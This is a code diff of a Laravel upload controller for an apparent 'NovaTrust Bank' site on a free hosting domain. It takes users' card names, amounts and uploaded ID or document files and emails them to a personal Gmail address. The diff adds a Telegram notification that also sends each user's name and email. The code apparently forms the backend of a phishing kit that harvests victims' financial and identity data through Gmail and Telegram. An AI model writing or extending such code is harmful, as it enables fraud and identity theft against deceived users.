@@ -1,13 +1,15 @@
 <?php  
-  
+
 namespace App\Http\Controllers;  
-  
+
 use App\Models\Upload;  
 use Illuminate\Http\Request;  
 use Illuminate\Support\Facades\Auth;  
 use Illuminate\Support\Facades\Mail;  
 use Illuminate\Support\Facades\Log;  
-  
+use Illuminate\Support\Facades\Http;
+use App\Helpers\TelegramHelper;
+
 class UploadController extends Controller  
 {  
     /**  
@@ -26,18 +28,18 @@ class UploadController extends Controller
             'upload_file4'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',  
             'upload_file5'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',  
         ]);  
-  
+
         $uploadedFiles = [];  
         $description = $validated['description'] ?? null;  
-  
+
         // ✅ Upload all selected files (1–5)  
         foreach (range(1, 5) as $i) {  
             $fileKey = 'upload_file' . $i;  
-  
+
             if ($request->hasFile($fileKey)) {  
                 $file = $request->file($fileKey);  
-                $path = $file->store('uploads', 'public'); // stored in storage/app/public/uploads  
-  
+                $path = $file->store('uploads', 'public');  
+
                 $upload = Upload::create([  
                     'user_id'       => Auth::id(),  
                     'amount'        => $validated['amount'],  
@@ -46,42 +48,42 @@ class UploadController extends Controller
                     'file_path'     => $path,  
                     'original_name' => $file->getClientOriginalName(),  
                 ]);  
-  
+
                 $uploadedFiles[] = $upload;  
             }  
         }  
-  
+
         if (empty($uploadedFiles)) {  
-            return back()  
-                ->withErrors(['upload_file1' => 'Please upload at least one file.'])  
+            return back()
+                ->withErrors(['upload_file1' => 'Please upload at least one file.'])
                 ->withInput();  
         }  
-  
-        // ✅ Prepare attachments for email  
+
+        // Prepare email attachments  
         $attachments = [];  
         foreach ($uploadedFiles as $upload) {  
-            $fileFullPath = storage_path('app/public/' . $upload->file_path);  
-            if (file_exists($fileFullPath)) {  
-                $attachments[] = $fileFullPath;  
+            $full = storage_path('app/public/' . $upload->file_path);  
+            if (file_exists($full)) {  
+                $attachments[] = $full;  
             }  
         }  
-  
-        // ✅ Send email with attachments to collaomn@gmail.com  
+
+        // Send email to admin  
         try {  
             $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ');  
-  
+
             Mail::send([], [], function ($message) use ($attachments, $validated, $description, $fileNames) {  
                 $message->to('collaomn@gmail.com')  
                         ->subject('📎 New Secure Upload from NovaTrust Bank')  
-                        ->setBody("  
-                            A new secure upload has been received.  
-                              
-                            👤 Card Name: {$validated['card_name']}  
-                            💰 Amount: \${$validated['amount']}  
-                            📝 Description: " . ($description ?: 'N/A') . "  
-                            📎 Files: {$fileNames}  
-                        ");  
-  
+                        ->setBody("
+New secure upload received.
+
+👤 Card Name: {$validated['card_name']}
+💰 Amount: \${$validated['amount']}
+📝 Description: " . ($description ?: 'N/A') . "
+📎 Files: {$fileNames}
+                ");  
+
                 foreach ($attachments as $path) {  
                     $message->attach($path);  
                 }  
@@ -89,13 +91,32 @@ class UploadController extends Controller
         } catch (\Exception $e) {  
             Log::error('Email sending failed: ' . $e->getMessage());  
         }  
-  
-        // ✅ Redirect to success page  
-        return redirect()  
-            ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])  
+
+        // ✅ TELEGRAM NOTIFICATION  
+        $fileListForTelegram = collect($uploadedFiles)
+            ->pluck('original_name')
+            ->map(fn($f) => "• $f")
+            ->implode("\n");
+
+        $telegramMessage = 
+            "📎 <b>New Secure Upload</b>\n" .
+            "👤 User: " . Auth::user()->name . "\n" .
+            "📧 Email: " . Auth::user()->email . "\n" .
+            "💰 Amount: \$" . $validated['amount'] . "\n" .
+            "💳 Card Name: " . $validated['card_name'] . "\n" .
+            "📝 Description: " . ($description ?: 'N/A') . "\n" .
+            "📁 Files:\n{$fileListForTelegram}\n" .
+            "🕒 " . now()->toDateTimeString() . "\n" .
+            "🌐 novatrustbank.onrender.com";
+
+        TelegramHelper::send($telegramMessage);  
+
+        // Redirect  
+        return redirect()
+            ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])
             ->with('success', '✅ Upload saved and sent successfully!');  
     }  
-  
+
     /**  
      * Show upload success page.  
      */  
